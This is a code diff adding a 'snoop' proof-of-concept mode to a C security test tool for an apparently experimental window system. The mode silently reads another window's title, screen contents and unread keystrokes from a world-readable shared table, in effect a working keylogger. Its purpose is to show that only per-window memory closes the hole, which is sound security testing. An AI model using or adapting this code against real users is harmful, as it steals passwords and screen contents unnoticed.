@@ -53,6 +53,34 @@
  * WSYS_RING_CAP byte-for-byte; if it stops, the injected bytes land at the
  * wrong offset, the protocol read of /dev/wsys/<wid>/keys comes back without
  * them, and tests/linux/wsys_bypass.sh's assertion fails loudly.
+ *
+ * A THIRD MODE, `snoop`, measures the half of the hole the other two do not
+ * touch and that no file mode can close.  The three attacks above are all
+ * INTEGRITY: they need PROT_WRITE, and the 0644 chrome segment shows what
+ * happens to them when the kernel refuses it.  This one is CONFIDENTIALITY,
+ * and it opens the file O_RDONLY and maps it PROT_READ ONLY -- deliberately,
+ * because that is the whole finding:
+ *
+ *     the window table has to be world-READABLE for the desktop to work.
+ *
+ * The panel taskbar parses every window's title out of /dev/wsys/windows; a
+ * uid-1001 client reads the screen geometry the root compositor published.  So
+ * even the strictest fix that keeps ONE table -- make /srv/wsys 0644 and put
+ * every write behind an authenticated RPC -- closes all three integrity attacks
+ * and NOT ONE of these:
+ *
+ *   KEYLOG      read the bytes between another window's `keys` ring r and w.
+ *               Those are that window's keystrokes: its password, as typed.
+ *   SCRAPE      read another window's committed `scene`, which is what is on
+ *               the screen inside it.
+ *   ENUMERATE   read every row's wid, pid, geometry and title.
+ *
+ * That is why THE SPLIT's "all of it or none" is not rhetoric: the only thing
+ * that closes these is per-window memory a non-owner cannot map at all, handed
+ * out by the authority at window creation -- not a mode, not a gate, not an RPC
+ * in front of a shared table.
+ *
+ *   wsys_bypass snoop <path> <wid=N|title-run> [tag]
  */
 #define _GNU_SOURCE
 #include <errno.h>
@@ -167,8 +195,90 @@ static int inject_key(const char *tag, const char *path,
     return 0;
 }
 
+/* Print a byte run with the framing characters made visible, so a ring's
+ * contents survive being read out of a shell variable by the harness. */
+static void put_run(const uint8_t *b, size_t n)
+{
+    for (size_t i = 0; i < n && i < 256; i++) {
+        unsigned c = b[i];
+        if (c == '\n')                    fputs("\\n", stdout);
+        else if (c >= 0x20 && c < 0x7f)   putchar((int)c);
+        else                              printf("\\x%02x", c);
+    }
+}
+
+/* snoop <path> <victim> [tag]: READ another window's row.  O_RDONLY and
+ * PROT_READ throughout -- if this ever needs write access the finding is
+ * wrong, so `ro=1` is printed as an assertion the harness checks rather than
+ * as a description.  Prints the victim's identity, its committed scene and the
+ * unread bytes of its `keys` ring, which are its keystrokes. */
+static int snoop(const char *tag, const char *path, const char *victim)
+{
+    printf("== %s", tag);
+
+    struct stat st;
+    if (stat(path, &st) != 0) { printf(" stat=-%d\n", errno); return 0; }
+    printf(" mode=0%o uid=%d", (unsigned)(st.st_mode & 07777), (int)st.st_uid);
+
+    int fd = open(path, O_RDONLY);
+    printf(" open_ro=%d", fd >= 0 ? fd : -errno);
+    if (fd < 0) { printf(" ro=1 found=0\n"); return 0; }
+
+    size_t len = (size_t)st.st_size;
+    void  *m   = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, 0);
+    printf(" mmap_ro=%s", m == MAP_FAILED ? "FAIL" : "0");
+    if (m == MAP_FAILED) { printf(" ro=1 found=0\n"); close(fd); return 0; }
+
+    const struct m_wwin *v = NULL;
+    if (strncmp(victim, "wid=", 4) == 0) {
+        int want = atoi(victim + 4);
+        const struct m_wshm *s = (const struct m_wshm *)m;
+        for (int i = 0; i < WSYS_MAX_WINDOWS; i++)
+            if (s->win[i].used && s->win[i].wid == want) { v = &s->win[i]; break; }
+    } else {
+        void *hit = memmem(m, len, victim, strlen(victim));
+        if (hit)
+            v = (const struct m_wwin *)((const uint8_t *)hit
+                                        - offsetof(struct m_wwin, title));
+    }
+
+    printf(" ro=1 found=%d", v != NULL);
+    if (v) {
+        printf(" wid=%d pid=%d geom=%d,%d,%d,%d title=[%.*s]",
+               v->wid, v->pid, v->x, v->y, v->w, v->h,
+               WSYS_TITLE_CAP, v->title);
+        uint32_t sl = v->scene_len;
+        if (sl > WSYS_SCENE_CAP) sl = WSYS_SCENE_CAP;
+        printf(" scenelen=%u scene=[", sl);
+        put_run(v->scene, sl);
+        fputs("]", stdout);
+        /* THE KEYSTROKES.  A ring reader sees exactly the bytes between r and
+         * w; this reads the same window without disturbing either counter, so
+         * the victim still receives everything it was sent and has no way to
+         * notice.  A keylogger that consumed the events would be a bug report;
+         * this one is silent. */
+        const struct m_wring *q = &v->keys;
+        uint32_t have = q->w - q->r;
+        if (have > WSYS_RING_CAP) have = WSYS_RING_CAP;
+        printf(" keyn=%u keys=[", have);
+        for (uint32_t i = 0; i < have && i < 256; i++) {
+            uint8_t c = q->b[(q->r + i) % WSYS_RING_CAP];
+            put_run(&c, 1);
+        }
+        fputs("]", stdout);
+    }
+    putchar('\n');
+    munmap(m, len);
+    close(fd);
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
+    /* snoop <path> <victim> [tag] */
+    if (argc >= 4 && strcmp(argv[1], "snoop") == 0)
+        return snoop(argc >= 5 ? argv[4] : "snoop.table", argv[2], argv[3]);
+
     /* injkey <path> <victim-title> <keyline> [tag] */
     if (argc >= 5 && strcmp(argv[1], "injkey") == 0)
         return inject_key(argc >= 6 ? argv[5] : "injkey.table",
